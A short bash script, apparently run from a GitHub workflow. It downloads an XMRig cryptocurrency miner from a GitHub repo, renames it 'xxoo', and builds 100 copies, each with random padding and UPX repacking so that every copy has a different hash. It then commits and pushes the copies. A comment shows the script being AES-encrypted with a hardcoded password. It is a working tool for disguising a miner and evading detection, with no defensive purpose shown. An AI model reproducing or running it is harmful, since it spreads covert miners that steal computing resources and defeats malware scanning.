#!/bin/bash

# cat obfuscated_xxoo.sh | openssl enc -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:7uhfudnfud909~~23

rm -rf xmrig-personal-shoguncao-6.22.2.tar.gz
rm -rf xmrig-personal-shoguncao-6.22.2
wget -q https://github.com/shoguncao/CDN/raw/xmrig/xmrig/xmrig-personal-shoguncao-6.22.2.tar.gz
tar -xvf xmrig-personal-shoguncao-6.22.2.tar.gz
mv xmrig-personal-shoguncao-6.22.2/xmrig xxoo
rm -rf xmrig-personal-shoguncao-6.22.2.tar.gz
rm -rf xmrig-personal-shoguncao-6.22.2

for i in {1..100}; do
    echo "i: ${i}"
    start_time=$(date +%s)
    dd if=/dev/urandom of=padding.bin bs=1 count=512
    cat xxoo padding.bin > tmp_xxoo
    chmod +x tmp_xxoo
    upx --best -o obfuscated_xxoo tmp_xxoo
    mv obfuscated_xxoo xxoo_${i}
    rm -rf padding.bin
    rm -rf tmp_xxoo
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))
    echo "i: ${i}, elapsed: ${elapsed} seconds"
done

rm -rf xxoo

git config --global user.email ${GITHUB_REPOSITORY_OWNER}@outlook.com
git config --global user.name ${GITHUB_REPOSITORY_OWNER}
git add -- .
git commit -m "add xxoo"
git push

exit 0

